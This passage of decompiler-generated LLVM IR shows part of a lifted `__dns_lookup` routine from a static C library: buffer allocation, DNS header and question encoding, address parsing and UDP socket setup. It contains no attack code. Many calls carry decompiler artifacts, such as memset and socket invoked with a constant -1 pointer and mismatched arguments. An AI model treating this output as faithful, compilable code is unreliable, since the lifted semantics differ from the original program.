  store i32 %v1_8055c8d, i32* %v2_8055c8f, align 4
  br label %dec_label_pc_8055c9a

dec_label_pc_8055c98:                             ; preds = %dec_label_pc_8055c6b, %dec_label_pc_8055c5e, %dec_label_pc_8055c26, %dec_label_pc_8055c3a, %entry
  br label %dec_label_pc_8055c9a

dec_label_pc_8055c9a:                             ; preds = %dec_label_pc_8055c7d, %dec_label_pc_8055c89, %dec_label_pc_8055c98
  %v0_8055c9f = phi i32 [ 1, %dec_label_pc_8055c7d ], [ 1, %dec_label_pc_8055c89 ], [ 0, %dec_label_pc_8055c98 ]
  ret i32 %v0_8055c9f

; uselistorder directives
  uselistorder i32 %v2_8055c4c, { 1, 0 }
  uselistorder i32 %v6_8055c4a, { 1, 0 }
  uselistorder i8 %v2_8055c4a, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8055c49, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8055c41, { 1, 0 }
  uselistorder i32 %v3_8055c3d, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8055c2634, { 1, 0 }
  uselistorder i32 %v2_8055c7235, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 3, 2, 1, 0 }
  uselistorder i32 254, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055c9a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055c98, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_8055c4a, { 1, 0 }
  uselistorder label %dec_label_pc_8055c26, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp34 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-252, align 4
  %v2_8055cb6 = call i32 @malloc(i32 512)
  store i32 %v2_8055cb6, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1025 to i8*), i8** %stack_var_-252, align 4
  store i32 %v2_8055cb6, i32* @ebp, align 4
  %v2_8055cc4 = call i32 @malloc(i32 1025)
  store i32 %v2_8055cc4, i32* %eax.global-to-local, align 4
  %v12_8055ccd = ptrtoint i32* %stack_var_-236 to i32
  %v1_8055cd0 = icmp eq i32 %v2_8055cb6, 0
  br i1 %v1_8055cd0, label %dec_label_pc_8056349, label %dec_label_pc_8055cd8

dec_label_pc_8055cd8:                             ; preds = %entry
  %v1_8055cd8 = icmp eq i32 %v2_8055cc4, 0
  br i1 %v1_8055cd8, label %dec_label_pc_8056349, label %dec_label_pc_8055ce0

dec_label_pc_8055ce0:                             ; preds = %dec_label_pc_8055cd8
  %v5_8055ce0 = icmp eq i32 %arg2, 0
  br i1 %v5_8055ce0, label %dec_label_pc_8056349, label %dec_label_pc_8055cee

dec_label_pc_8055cee:                             ; preds = %dec_label_pc_8055ce0
  %v4_8055cee = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055cee, i32* %eax.global-to-local, align 4
  %v2_8055cf5 = load i8, i8* %arg1, align 1
  %v3_8055cf5 = icmp eq i8 %v2_8055cf5, 0
  br i1 %v3_8055cf5, label %dec_label_pc_8056349, label %dec_label_pc_8055cfe

dec_label_pc_8055cfe:                             ; preds = %dec_label_pc_8055cee
  store i8* %arg1, i8** %stack_var_-252, align 4
  %v3_8055d02 = call i32 @strlen(i8* nonnull %arg1)
  store i32 %v3_8055d02, i32* @eax, align 4
  store i32 %v4_8055cee, i32* %edx.global-to-local, align 4
  %v2_8055d25 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_8055d25, i32* @ebx, align 4
  %tmp47 = bitcast i32* %stack_var_-52 to i8*
  store i8* %tmp47, i8** %stack_var_-252, align 4
  %v3_8055d2d = call i32 @__pthread_return_void(i32 %v2_8055d25, i32 134564459)
  store i32 %v3_8055d2d, i32* %eax.global-to-local, align 4
  store i8* bitcast (i8** @global_var_80636e8.580 to i8*), i8** %stack_var_-252, align 4
  %v2_8055d39 = call i32 @__pthread_return_0(i32 ptrtoint (i8** @global_var_80636e8.580 to i32))
  %v0_8055d3e = load i64, i64* @global_var_8063700.581, align 8
  %v1_8055d3e = trunc i64 %v0_8055d3e to i32
  %v1_8055d43 = ashr i32 %v1_8055d3e, 31
  %v6_8055d44 = and i64 %v0_8055d3e, 4294967295
  %v8_8055d44 = zext i32 %v1_8055d43 to i64
  %v9_8055d44 = mul nuw i64 %v8_8055d44, 4294967296
  %v10_8055d44 = or i64 %v9_8055d44, %v6_8055d44
  %v14_8055d44 = srem i64 %v10_8055d44, %tmp34
  %v15_8055d44 = trunc i64 %v14_8055d44 to i32
  %v0_8055d4b = load i16, i16* @global_var_805d444.582, align 4
  %v2_8055d5a = load i8*, i8** %stack_var_-252, align 4
  %v3_8055d5a = ptrtoint i8* %v2_8055d5a to i32
  store i32 %v3_8055d5a, i32* @eax, align 4
  store i32 134564459, i32* %edx.global-to-local, align 4
  store i8* %tmp47, i8** %stack_var_-252, align 4
  %v3_8055d5f = call i32 @__pthread_return_void(i32 %v2_8055d25, i32 1)
  store i32 %v3_8055d5f, i32* %eax.global-to-local, align 4
  %v3_8055da3 = sext i16 %v0_8055d4b to i32
  %v5_8055f06 = inttoptr i32 %v15_8055d44 to i8*
  %v1_805632488 = add i32 %v12_8055ccd, 28
  %v2_805632489 = inttoptr i32 %v1_805632488 to i32*
  %v3_805632490 = load i32, i32* %v2_805632489, align 4
  %tmp120 = icmp ult i32 %v3_805632490, 3
  br i1 %tmp120, label %dec_label_pc_8055d84, label %dec_label_pc_8056349

dec_label_pc_8055d84:                             ; preds = %dec_label_pc_8055cfe, %dec_label_pc_8056324.backedge
  %v0_8055d8b93 = phi i32 [ %v0_8056324.pre, %dec_label_pc_8056324.backedge ], [ %v12_8055ccd, %dec_label_pc_8055cfe ]
  %v1_8055d84 = add i32 %v0_8055d8b93, 20
  %v2_8055d84 = inttoptr i32 %v1_8055d84 to i32*
  %v3_8055d84 = load i32, i32* %v2_8055d84, align 4
  %v13_8055d84 = icmp eq i32 %v3_8055d84, -1
  br i1 %v13_8055d84, label %dec_label_pc_8055d84.dec_label_pc_8055d9a_crit_edge, label %dec_label_pc_8055d8b

dec_label_pc_8055d84.dec_label_pc_8055d9a_crit_edge: ; preds = %dec_label_pc_8055d84
  %v0_8055d9a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055d9a

dec_label_pc_8055d8b:                             ; preds = %dec_label_pc_8055d84
  %v3_8055d8e = load i32, i32* %v2_8055d84, align 4
  %v5_8055d8e = add i32 %v0_8055d8b93, -16
  %v6_8055d8e = inttoptr i32 %v5_8055d8e to i32*
  store i32 %v3_8055d8e, i32* %v6_8055d8e, align 4
  %v1_8055d92 = call i32 @__libc_close(i32 -1)
  store i32 %v1_8055d92, i32* %eax.global-to-local, align 4
  %v0_8055d97 = load i32, i32* @esp, align 4
  %v1_8055d97 = add i32 %v0_8055d97, 16
  br label %dec_label_pc_8055d9a

dec_label_pc_8055d9a:                             ; preds = %dec_label_pc_8055d84.dec_label_pc_8055d9a_crit_edge, %dec_label_pc_8055d8b
  %v1_8055d9a = phi i32 [ %v0_8055d8b93, %dec_label_pc_8055d84.dec_label_pc_8055d9a_crit_edge ], [ %v1_8055d97, %dec_label_pc_8055d8b ]
  %v0_8055d9a = phi i32 [ %v0_8055d9a.pre, %dec_label_pc_8055d84.dec_label_pc_8055d9a_crit_edge ], [ %v1_8055d92, %dec_label_pc_8055d8b ]
  %v2_8055d9a = add i32 %v1_8055d9a, -4
  %v3_8055d9a = inttoptr i32 %v2_8055d9a to i32*
  store i32 %v0_8055d9a, i32* %v3_8055d9a, align 4
  %v1_8055d9b = add i32 %v1_8055d9a, -8
  %v2_8055d9b = inttoptr i32 %v1_8055d9b to i32*
  store i32 512, i32* %v2_8055d9b, align 4
  %v1_8055da0 = add i32 %v1_8055d9a, -12
  %v2_8055da0 = inttoptr i32 %v1_8055da0 to i32*
  store i32 0, i32* %v2_8055da0, align 4
  %v2_8055da2 = add i32 %v1_8055d9a, -16
  %v3_8055da2 = inttoptr i32 %v2_8055da2 to i32*
  store i32 %v2_8055cb6, i32* %v3_8055da2, align 4
  %v5_8055da3 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_8055d44, i32 %v3_8055da3)
  store i32 %v5_8055da3, i32* %eax.global-to-local, align 4
  %v0_8055da8 = load i32, i32* @esp, align 4
  %v1_8055dab = add i32 %v0_8055da8, 8
  %v2_8055dab = inttoptr i32 %v1_8055dab to i32*
  store i32 48, i32* %v2_8055dab, align 4
  %v1_8055dad = add i32 %v0_8055da8, 4
  %v2_8055dad = inttoptr i32 %v1_8055dad to i32*
  store i32 0, i32* %v2_8055dad, align 4
  %v1_8055daf = add i32 %v0_8055da8, 84
  store i32 %v1_8055daf, i32* @ebx, align 4
  %v3_8055db3 = inttoptr i32 %v0_8055da8 to i32*
  store i32 %v1_8055daf, i32* %v3_8055db3, align 4
  %v5_8055db4 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_8055d44, i32 %v3_8055da3)
  store i32 %v5_8055db4, i32* %eax.global-to-local, align 4
  %v0_8055db9 = load i32, i32* @esp, align 4
  %v1_8055db9 = add i32 %v0_8055db9, 60
  %v2_8055db9 = inttoptr i32 %v1_8055db9 to i32*
  %v3_8055db9 = load i32, i32* %v2_8055db9, align 4
  store i32 %v3_8055db9, i32* %eax.global-to-local, align 4
  %v1_8055dbd = add i32 %v0_8055db9, 116
  %v2_8055dbd = inttoptr i32 %v1_8055dbd to i32*
  store i32 1, i32* %v2_8055dbd, align 4
  %v0_8055dc5 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055dc5 = add i32 %v0_8055dc5, 1
  %v0_8055dc6 = load i32, i32* @esp, align 4
  %v1_8055dc6 = add i32 %v0_8055dc6, 104
  %v2_8055dc6 = inttoptr i32 %v1_8055dc6 to i32*
  store i32 1, i32* %v2_8055dc6, align 4
  %v1_8055dce = urem i32 %v1_8055dc5, 65536
  store i32 %v1_8055dce, i32* %eax.global-to-local, align 4
  %v1_8055dd3 = load i32, i32* @esp, align 4
  %v2_8055dd3 = add i32 %v1_8055dd3, 60
  %v3_8055dd3 = inttoptr i32 %v2_8055dd3 to i32*
  store i32 %v1_8055dce, i32* %v3_8055dd3, align 4
  %v0_8055dd7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055dd7 = load i32, i32* @esp, align 4
  %v2_8055dd7 = add i32 %v1_8055dd7, 84
  %v3_8055dd7 = inttoptr i32 %v2_8055dd7 to i32*
  store i32 %v0_8055dd7, i32* %v3_8055dd7, align 4
  %v0_8055ddb = load i32, i32* @esp, align 4
  %v1_8055dde = add i32 %v0_8055ddb, 8
  %v2_8055dde = inttoptr i32 %v1_8055dde to i32*
  store i32 512, i32* %v2_8055dde, align 4
  %v2_8055de3 = add i32 %v0_8055ddb, 4
  %v3_8055de3 = inttoptr i32 %v2_8055de3 to i32*
  store i32 %v2_8055cb6, i32* %v3_8055de3, align 4
  %v0_8055de4 = load i32, i32* @ebx, align 4
  %v3_8055de4 = inttoptr i32 %v0_8055ddb to i32*
  store i32 %v0_8055de4, i32* %v3_8055de4, align 4
  %v0_8055de5 = call i32 @__encode_header()
  store i32 %v0_8055de5, i32* %eax.global-to-local, align 4
  %v0_8055dea = load i32, i32* @esp, align 4
  store i32 %v0_8055de5, i32* @ebx, align 4
  %v2_8055def = icmp slt i32 %v0_8055de5, 0
  br i1 %v2_8055def, label %dec_label_pc_8056349, label %dec_label_pc_8055df7

dec_label_pc_8055df7:                             ; preds = %dec_label_pc_8055d9a
  %v2_8055df7 = add i32 %v0_8055dea, 12
  %v3_8055df7 = inttoptr i32 %v2_8055df7 to i32*
  store i32 %v0_8055de5, i32* %v3_8055df7, align 4
  %v1_8055df8 = add i32 %v0_8055dea, 8
  %v2_8055df8 = inttoptr i32 %v1_8055df8 to i32*
  store i32 1025, i32* %v2_8055df8, align 4
  %v1_8055dfd = add i32 %v0_8055dea, 256
  %v2_8055dfd = inttoptr i32 %v1_8055dfd to i32*
  %v3_8055dfd = load i32, i32* %v2_8055dfd, align 4
  %v5_8055dfd = add i32 %v0_8055dea, 4
  %v6_8055dfd = inttoptr i32 %v5_8055dfd to i32*
  store i32 %v3_8055dfd, i32* %v6_8055dfd, align 4
  %v1_8055e04 = add i32 %v0_8055dea, 28
  %v2_8055e04 = inttoptr i32 %v1_8055e04 to i32*
  %v3_8055e04 = load i32, i32* %v2_8055e04, align 4
  %v6_8055e04 = inttoptr i32 %v0_8055dea to i32*
  store i32 %v3_8055e04, i32* %v6_8055e04, align 4
  %v5_8055e08 = call i32 @strncpy(i8* inttoptr (i32 -1 to i8*), i32 %v15_8055d44, i32 %v3_8055da3)
  %v0_8055e0d = load i32, i32* @esp, align 4
  %v1_8055e10 = add i32 %v0_8055e0d, 8
  %v2_8055e10 = inttoptr i32 %v1_8055e10 to i32*
  store i32 ptrtoint (i32* @global_var_805d448.518 to i32), i32* %v2_8055e10, align 4
  %v1_8055e15 = add i32 %v0_8055e0d, 4
  %v2_8055e15 = inttoptr i32 %v1_8055e15 to i32*
  store i32 134564459, i32* %v2_8055e15, align 4
  %v1_8055e1a = add i32 %v0_8055e0d, 200
  store i32 %v1_8055e1a, i32* @eax, align 4
  %v3_8055e21 = inttoptr i32 %v0_8055e0d to i32*
  store i32 %v1_8055e1a, i32* %v3_8055e21, align 4
  %v2_8055e22 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8055d44)
  store i32 %v2_8055e22, i32* %eax.global-to-local, align 4
  %v0_8055e27 = load i32, i32* @esp, align 4
  %v1_8055e27 = inttoptr i32 %v0_8055e27 to i32*
  store i32 ptrtoint (i32* @global_var_805d448.518 to i32), i32* %v1_8055e27, align 4
  %v1_8055e2e = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8055e2e, i32* %eax.global-to-local, align 4
  %v0_8055e33 = load i32, i32* @esp, align 4
  %v1_8055e33 = add i32 %v0_8055e33, 56
  %v2_8055e33 = inttoptr i32 %v1_8055e33 to i32*
  %v3_8055e33 = load i32, i32* %v2_8055e33, align 4
  store i32 %v3_8055e33, i32* %edx.global-to-local, align 4
  %v1_8055e37 = add i32 %v0_8055e33, 268
  %v2_8055e37 = inttoptr i32 %v1_8055e37 to i32*
  %v3_8055e37 = load i32, i32* %v2_8055e37, align 4
  store i32 %v3_8055e37, i32* %eax.global-to-local, align 4
  %v2_8055e3e = mul i32 %v3_8055e33, 4
  %v3_8055e3e = add i32 %v3_8055e37, %v2_8055e3e
  %v4_8055e3e = inttoptr i32 %v3_8055e3e to i32*
  %v5_8055e3e = load i32, i32* %v4_8055e3e, align 4
  store i32 %v5_8055e3e, i32* %edx.global-to-local, align 4
  %v2_8055e41 = add i32 %v0_8055e33, 48
  %v3_8055e41 = inttoptr i32 %v2_8055e41 to i32*
  store i32 %v5_8055e3e, i32* %v3_8055e41, align 4
  %v0_8055e45 = load i32, i32* @esp, align 4
  %v1_8055e45 = add i32 %v0_8055e45, 16
  %v1_8055e48 = add i32 %v0_8055e45, 52
  %v2_8055e48 = inttoptr i32 %v1_8055e48 to i32*
  %v3_8055e48 = load i32, i32* %v2_8055e48, align 4
  %v5_8055e48 = icmp slt i32 %v3_8055e48, 0
  br i1 %v5_8055e48, label %dec_label_pc_8055df7.dec_label_pc_8055e8e_crit_edge, label %dec_label_pc_8055e4f

dec_label_pc_8055df7.dec_label_pc_8055e8e_crit_edge: ; preds = %dec_label_pc_8055df7
  %v0_8055e8e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055e8e

dec_label_pc_8055e4f:                             ; preds = %dec_label_pc_8055df7
  store i32 %v3_8055e48, i32* %eax.global-to-local, align 4
  %v1_8055e53 = load i32, i32* @global_var_8063b38.583, align 8
  %v2_8055e53 = sub i32 %v3_8055e48, %v1_8055e53
  %v8_8055e53 = xor i32 %v1_8055e53, %v3_8055e48
  %v9_8055e53 = xor i32 %v2_8055e53, %v3_8055e48
  %v10_8055e53 = and i32 %v9_8055e53, %v8_8055e53
  %v11_8055e53 = icmp slt i32 %v10_8055e53, 0
  %v13_8055e53 = icmp slt i32 %v2_8055e53, 0
  %v2_8055e59 = icmp eq i1 %v13_8055e53, %v11_8055e53
  br i1 %v2_8055e59, label %dec_label_pc_8055e8e, label %dec_label_pc_8055e5b

dec_label_pc_8055e5b:                             ; preds = %dec_label_pc_8055e4f
  %v2_8055e5b = add i32 %v0_8055e45, 12
  %v3_8055e5b = inttoptr i32 %v2_8055e5b to i32*
  store i32 %v3_8055e48, i32* %v3_8055e5b, align 4
  %v1_8055e5c = add i32 %v0_8055e45, 8
  %v2_8055e5c = inttoptr i32 %v1_8055e5c to i32*
  store i32 1025, i32* %v2_8055e5c, align 4
  %v1_8055e61 = add i32 %v0_8055e45, 4
  %v2_8055e61 = inttoptr i32 %v1_8055e61 to i32*
  store i32 ptrtoint (i32* @global_var_805c8fc.584 to i32), i32* %v2_8055e61, align 4
  %v1_8055e66 = add i32 %v0_8055e45, 28
  %v2_8055e66 = inttoptr i32 %v1_8055e66 to i32*
  %v3_8055e66 = load i32, i32* %v2_8055e66, align 4
  %v6_8055e66 = inttoptr i32 %v0_8055e45 to i32*
  store i32 %v3_8055e66, i32* %v6_8055e66, align 4
  %v0_8055e6a = call i32 @__GI_strncat()
  store i32 %v0_8055e6a, i32* %eax.global-to-local, align 4
  %v0_8055e6f = load i32, i32* @esp, align 4
  %v1_8055e72 = add i32 %v0_8055e6f, 8
  %v2_8055e72 = inttoptr i32 %v1_8055e72 to i32*
  store i32 1025, i32* %v2_8055e72, align 4
  %v1_8055e77 = add i32 %v0_8055e6f, 52
  %v2_8055e77 = inttoptr i32 %v1_8055e77 to i32*
  %v3_8055e77 = load i32, i32* %v2_8055e77, align 4
  store i32 %v3_8055e77, i32* %edx.global-to-local, align 4
  %v1_8055e7b = mul i32 %v3_8055e77, 4
  %v2_8055e7b = add i32 %v1_8055e7b, 134626072
  %v3_8055e7b = inttoptr i32 %v2_8055e7b to i32*
  %v4_8055e7b = load i32, i32* %v3_8055e7b, align 4
  %v6_8055e7b = add i32 %v0_8055e6f, 4
  %v7_8055e7b = inttoptr i32 %v6_8055e7b to i32*
  store i32 %v4_8055e7b, i32* %v7_8055e7b, align 4
  %v1_8055e82 = add i32 %v0_8055e6f, 28
  %v2_8055e82 = inttoptr i32 %v1_8055e82 to i32*
  %v3_8055e82 = load i32, i32* %v2_8055e82, align 4
  %v6_8055e82 = inttoptr i32 %v0_8055e6f to i32*
  store i32 %v3_8055e82, i32* %v6_8055e82, align 4
  %v0_8055e86 = call i32 @__GI_strncat()
  store i32 %v0_8055e86, i32* %eax.global-to-local, align 4
  %v0_8055e8b = load i32, i32* @esp, align 4
  %v1_8055e8b = add i32 %v0_8055e8b, 16
  br label %dec_label_pc_8055e8e

dec_label_pc_8055e8e:                             ; preds = %dec_label_pc_8055df7.dec_label_pc_8055e8e_crit_edge, %dec_label_pc_8055e4f, %dec_label_pc_8055e5b
  %v1_8055e8e = phi i32 [ %v1_8055e45, %dec_label_pc_8055df7.dec_label_pc_8055e8e_crit_edge ], [ %v1_8055e45, %dec_label_pc_8055e4f ], [ %v1_8055e8b, %dec_label_pc_8055e5b ]
  %v0_8055e8e = phi i32 [ %v0_8055e8e.pre, %dec_label_pc_8055df7.dec_label_pc_8055e8e_crit_edge ], [ %v3_8055e48, %dec_label_pc_8055e4f ], [ %v0_8055e86, %dec_label_pc_8055e5b ]
  %v2_8055e8e = add i32 %v1_8055e8e, -4
  %v3_8055e8e = inttoptr i32 %v2_8055e8e to i32*
  store i32 %v0_8055e8e, i32* %v3_8055e8e, align 4
  %v0_8055e8f = load i32, i32* %eax.global-to-local, align 4
  %v2_8055e8f = add i32 %v1_8055e8e, -8
  %v3_8055e8f = inttoptr i32 %v2_8055e8f to i32*
  store i32 %v0_8055e8f, i32* %v3_8055e8f, align 4
  %v1_8055e90 = add i32 %v1_8055e8e, -12
  %v2_8055e90 = inttoptr i32 %v1_8055e90 to i32*
  store i32 1, i32* %v2_8055e90, align 4
  %v1_8055e92 = add i32 %v1_8055e8e, 184
  store i32 %v1_8055e92, i32* @eax, align 4
  %v2_8055e99 = add i32 %v1_8055e8e, -16
  %v3_8055e99 = inttoptr i32 %v2_8055e99 to i32*
  store i32 %v1_8055e92, i32* %v3_8055e99, align 4
  %v2_8055e9a = call i32 @__pthread_return_void(i32 -1, i32 %v15_8055d44)
  store i32 %v2_8055e9a, i32* %eax.global-to-local, align 4
  %v0_8055e9f = load i32, i32* @esp, align 4
  %v1_8055e9f = add i32 %v0_8055e9f, 28
  %v2_8055e9f = inttoptr i32 %v1_8055e9f to i32*
  %v3_8055e9f = load i32, i32* %v2_8055e9f, align 4
  store i32 %v3_8055e9f, i32* %eax.global-to-local, align 4
  %v1_8055ea3 = add i32 %v0_8055e9f, 260
  %v2_8055ea3 = inttoptr i32 %v1_8055ea3 to i32*
  %v3_8055ea3 = load i32, i32* %v2_8055ea3, align 4
  store i32 %v3_8055ea3, i32* @edx, align 4
  %v2_8055eaa = add i32 %v0_8055e9f, 216
  %v3_8055eaa = inttoptr i32 %v2_8055eaa to i32*
  store i32 %v3_8055e9f, i32* %v3_8055eaa, align 4
  %v0_8055eb1 = load i32, i32* @edx, align 4
  %v1_8055eb1 = load i32, i32* @esp, align 4
  %v2_8055eb1 = add i32 %v1_8055eb1, 220
  %v3_8055eb1 = inttoptr i32 %v2_8055eb1 to i32*
  store i32 %v0_8055eb1, i32* %v3_8055eb1, align 4
  %v0_8055eb8 = load i32, i32* @esp, align 4
  %v1_8055eb8 = add i32 %v0_8055eb8, 224
  %v2_8055eb8 = inttoptr i32 %v1_8055eb8 to i32*
  store i32 1, i32* %v2_8055eb8, align 4
  %v0_8055ec8 = load i32, i32* @esp, align 4
  %v1_8055ecb = load i32, i32* @ebx, align 4
  %v2_8055ecb = sub i32 512, %v1_8055ecb
  %v2_8055ecd = add i32 %v0_8055ec8, 8
  %v3_8055ecd = inttoptr i32 %v2_8055ecd to i32*
  store i32 %v2_8055ecb, i32* %v3_8055ecd, align 4
  %v1_8055ece = load i32, i32* @ebx, align 4
  %v2_8055ece = add i32 %v1_8055ece, %v2_8055cb6
  %v2_8055ed2 = add i32 %v0_8055ec8, 4
  %v3_8055ed2 = inttoptr i32 %v2_8055ed2 to i32*
  store i32 %v2_8055ece, i32* %v3_8055ed2, align 4
  %v1_8055ed3 = add i32 %v0_8055ec8, 216
  store i32 %v1_8055ed3, i32* @eax, align 4
  %v3_8055eda = inttoptr i32 %v0_8055ec8 to i32*
  store i32 %v1_8055ed3, i32* %v3_8055eda, align 4
  %v0_8055edb = call i32 @__encode_question()
  store i32 %v0_8055edb, i32* %eax.global-to-local, align 4
  %v0_8055ee0 = load i32, i32* @esp, align 4
  store i32 %v0_8055edb, i32* @esi, align 4
  %v2_8055ee5 = icmp slt i32 %v0_8055edb, 0
  br i1 %v2_8055ee5, label %dec_label_pc_8056349, label %dec_label_pc_8055eed

dec_label_pc_8055eed:                             ; preds = %dec_label_pc_8055e8e
  %v1_8055eed = add i32 %v0_8055ee0, 172
  %v2_8055eed = inttoptr i32 %v1_8055eed to i16*
  store i16 2, i16* %v2_8055eed, align 2
  %v1_8055ef7 = load i32, i32* @esp, align 4
  %v2_8055ef7 = add i32 %v1_8055ef7, -4
  %v3_8055ef7 = inttoptr i32 %v2_8055ef7 to i32*
  store i32 %v0_8055edb, i32* %v3_8055ef7, align 4
  %v1_8055ef8 = add i32 %v1_8055ef7, 164
  store i32 %v1_8055ef8, i32* %eax.global-to-local, align 4
  %v2_8055eff = add i32 %v1_8055ef7, -8
  %v3_8055eff = inttoptr i32 %v2_8055eff to i32*
  store i32 %v1_8055ef8, i32* %v3_8055eff, align 4
  %v1_8055f00 = add i32 %v1_8055ef7, 32
  %v2_8055f00 = inttoptr i32 %v1_8055f00 to i32*
  %v3_8055f00 = load i32, i32* %v2_8055f00, align 4
  %v5_8055f00 = add i32 %v1_8055ef7, -12
  %v6_8055f00 = inttoptr i32 %v5_8055f00 to i32*
  store i32 %v3_8055f00, i32* %v6_8055f00, align 4
  %v1_8055f04 = add i32 %v1_8055ef7, -16
  %v2_8055f04 = inttoptr i32 %v1_8055f04 to i32*
  store i32 10, i32* %v2_8055f04, align 4
  %v6_8055f06 = call i32 @inet_pton(i32 -1, i8* %v5_8055f06, i32 %v3_8055da3, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8055f06, i32* %eax.global-to-local, align 4
  %v0_8055f0b = load i32, i32* @esp, align 4
  %v1_8055f0b = add i32 %v0_8055f0b, 16
  %tmp48 = icmp slt i32 %v6_8055f06, 1
  br i1 %tmp48, label %dec_label_pc_8055f1c, label %dec_label_pc_8055f12

dec_label_pc_8055f12:                             ; preds = %dec_label_pc_8055eed
  %v1_8055f12 = add i32 %v0_8055f0b, 172
  %v2_8055f12 = inttoptr i32 %v1_8055f12 to i16*
  store i16 10, i16* %v2_8055f12, align 2
  %v0_8055f1c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055f1c

dec_label_pc_8055f1c:                             ; preds = %dec_label_pc_8055eed, %dec_label_pc_8055f12
  %v0_8055f33 = phi i32 [ %v1_8055f0b, %dec_label_pc_8055eed ], [ %v0_8055f1c.pre, %dec_label_pc_8055f12 ]
  %v1_8055f1c = add i32 %v0_8055f33, 156
  %v2_8055f1c = inttoptr i32 %v1_8055f1c to i16*
  %v3_8055f1c = load i16, i16* %v2_8055f1c, align 2
  %v12_8055f1c = icmp eq i16 %v3_8055f1c, 10
  %v1_8055f25 = icmp eq i1 %v12_8055f1c, false
  %v1_8055f33 = add i32 %v0_8055f33, 158
  %v2_8055f33 = inttoptr i32 %v1_8055f33 to i16*
  store i16 13568, i16* %v2_8055f33, align 2
  %v0_8055f3d = load i32, i32* @esp, align 4
  br i1 %v1_8055f25, label %dec_label_pc_8055f33, label %dec_label_pc_8055f53

dec_label_pc_8055f33:                             ; preds = %dec_label_pc_8055f1c
  %v1_8055f40 = add i32 %v0_8055f3d, 32
  %v2_8055f40 = inttoptr i32 %v1_8055f40 to i32*
  %v3_8055f40 = load i32, i32* %v2_8055f40, align 4
  %v5_8055f40 = add i32 %v0_8055f3d, -16
  %v6_8055f40 = inttoptr i32 %v5_8055f40 to i32*
  store i32 %v3_8055f40, i32* %v6_8055f40, align 4
  %v1_8055f44 = call i32 @inet_addr(i32 -1)
  store i32 %v1_8055f44, i32* %eax.global-to-local, align 4
  %v1_8055f49 = load i32, i32* @esp, align 4
  %v2_8055f49 = add i32 %v1_8055f49, 176
  %v3_8055f49 = inttoptr i32 %v2_8055f49 to i32*
  store i32 %v1_8055f44, i32* %v3_8055f49, align 4
  %v0_8055f50 = load i32, i32* @esp, align 4
  %v1_8055f50 = add i32 %v0_8055f50, 16
  br label %dec_label_pc_8055f53

dec_label_pc_8055f53:                             ; preds = %dec_label_pc_8055f1c, %dec_label_pc_8055f33
  %v1_8055f53 = phi i32 [ %v1_8055f50, %dec_label_pc_8055f33 ], [ %v0_8055f3d, %dec_label_pc_8055f1c ]
  %v0_8055f53 = load i32, i32* @ecx, align 4
  %v2_8055f53 = add i32 %v1_8055f53, -4
  %v3_8055f53 = inttoptr i32 %v2_8055f53 to i32*
  store i32 %v0_8055f53, i32* %v3_8055f53, align 4
  %v1_8055f54 = add i32 %v1_8055f53, -8
  %v2_8055f54 = inttoptr i32 %v1_8055f54 to i32*
  store i32 17, i32* %v2_8055f54, align 4
  %v1_8055f56 = add i32 %v1_8055f53, -12
  %v2_8055f56 = inttoptr i32 %v1_8055f56 to i32*
  store i32 2, i32* %v2_8055f56, align 4
  %v1_8055f58 = add i32 %v1_8055f53, 156
  %v2_8055f58 = inttoptr i32 %v1_8055f58 to i16*
  %v3_8055f58 = load i16, i16* %v2_8055f58, align 2
  %v4_8055f58 = zext i16 %v3_8055f58 to i32
  store i32 %v4_8055f58, i32* %eax.global-to-local, align 4
  %v2_8055f60 = add i32 %v1_8055f53, -16
  %v3_8055f60 = inttoptr i32 %v2_8055f60 to i32*
  store i32 %v4_8055f58, i32* %v3_8055f60, align 4
  %v4_8055f61 = call i32 @socket(i32 -1, i32 %v15_8055d44, i32 %v3_8055da3)
  store i32 %v4_8055f61, i32* %eax.global-to-local, align 4
  %v1_8055f66 = load i32, i32* @esp, align 4
  %v2_8055f66 = add i32 %v1_8055f66, 36
  %v3_8055f66 = inttoptr i32 %v2_8055f66 to i32*
  store i32 %v4_8055f61, i32* %v3_8055f66, align 4
  %v0_8055f6a = load i32, i32* @esp, align 4
  %v1_8055f6a = add i32 %v0_8055f6a, 16
  %v0_8055f6d = load i32, i32* %eax.global-to-local, align 4
  %v2_8055f6d = icmp slt i32 %v0_8055f6d, 0
  br i1 %v2_8055f6d, label %dec_label_pc_8055f9a, label %dec_label_pc_8055f71

dec_label_pc_8055f71:                             ; preds = %dec_label_pc_8055f53
  %v1_8055f71 = add i32 %v0_8055f6a, 172
  store i32 %v1_8055f71, i32* %eax.global-to-local, align 4
  %v0_8055f78 = load i32, i32* @edx, align 4
  %v2_8055f78 = add i32 %v0_8055f6a, 12
  %v3_8055f78 = inttoptr i32 %v2_8055f78 to i32*
